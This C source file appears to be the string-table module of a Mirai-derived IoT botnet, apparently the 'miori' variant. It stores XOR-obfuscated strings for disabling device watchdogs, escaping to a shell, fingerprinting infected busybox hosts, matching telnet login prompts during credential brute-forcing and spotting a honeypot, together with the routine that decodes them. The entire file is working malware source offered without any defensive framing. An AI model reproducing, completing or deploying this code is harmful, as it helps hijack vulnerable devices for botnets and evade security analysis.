#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeedeebf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	
	// strings encryption shit!!

	// /dev/watchdog
	add_entry(TABLE_MISC_DOG, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 14);
    // /dev/misc/watchdog
	add_entry(TABLE_MISC_DOG1, "\x4D\x06\x07\x14\x4D\x0F\x0B\x11\x01\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 19);
	// /dev/FTWDT101_watchdog
	add_entry(TABLE_MISC_DOG2, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 23);
	// /dev/FTWDT101\ watchdog
	add_entry(TABLE_MISC_DOG3, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3E\x42\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 24);
	// /dev/watchdog0
	add_entry(TABLE_MISC_DOG4, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x52\x62", 15);
	// /etc/default/watchdog
	add_entry(TABLE_MISC_DOG5, "\x4D\x07\x16\x01\x4D\x06\x07\x04\x03\x17\x0E\x16\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 22);
	// /sbin/watchdog
	add_entry(TABLE_MISC_DOG6, "\x4D\x11\x00\x0B\x0C\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 15);
	// 1gba4cdom53nhp12eiegae
	add_entry(TABLE_MISC_RAND, "\x53\x05\x00\x03\x56\x01\x06\x0D\x0F\x57\x51\x0C\x0A\x12\x53\x50\x07\x0B\x07\x05\x03\x07\x62", 23);
	
	// rep shit!!
	add_entry(TABLE_SCAN_SHELL, "\x11\x0A\x07\x0E\x0E\x62", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x07\x0C\x03\x00\x0E\x07\x62", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x11\x1B\x11\x16\x07\x0F\x62", 7);
    add_entry(TABLE_SCAN_SH, "\x11\x0A\x62", 3);
	
    add_entry(TABLE_SCAN_QUERY, "\x07\x01\x0A\x0D\x42\x4F\x07\x42\x40\x3E\x1A\x54\x06\x3E\x1A\x54\x5B\x3E\x1A\x54\x04\x3E\x1A\x55\x50\x3E\x1A\x54\x5B\x3E\x1A\x54\x51\x3E\x1A\x54\x5A\x40\x62", 39);// busybox miori
    add_entry(TABLE_SCAN_RESP, "\x0F\x0B\x0D\x10\x0B\x01\x0A\x62", 8); // miori: applet not found
	
	// assword
	add_entry(TABLE_SCAN_ASSWORD, "\x03\x11\x11\x15\x0D\x10\x06\x62", 8);
	// ogin
	add_entry(TABLE_SCAN_OGIN, "\x0D\x05\x0B\x0C\x62", 5);
	// enter
	add_entry(TABLE_SCAN_ENTER, "\x07\x0C\x16\x07\x10\x62", 6);
	// ccount
	add_entry(TABLE_SCAN_CONT, "\x01\x01\x0D\x17\x0C\x16\x62", 7);
	// ser
	add_entry(TABLE_SCAN_NAME, "\x11\x07\x10\x62", 4);
	// ncorrect
	add_entry(TABLE_NCORRECT, "\x0C\x01\x0D\x10\x10\x07\x01\x16\x62", 9);
	// nvalid
	add_entry(TABLE_NVALID, "\x0C\x14\x03\x0E\x0B\x06\x62", 7);
	// ncomplete
	add_entry(TABLE_NCOM, "\x0C\x01\x0D\x0F\x12\x0E\x07\x16\x07\x62", 10);
	// attempt failed
	add_entry(TABLE_ATEMP, "\x03\x16\x16\x07\x0F\x12\x16\x42\x04\x03\x0B\x0E\x07\x06\x62", 15);
	// svr04
	add_entry(TABLE_HPOT, "\x11\x14\x10\x52\x56\x62", 6);
	
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
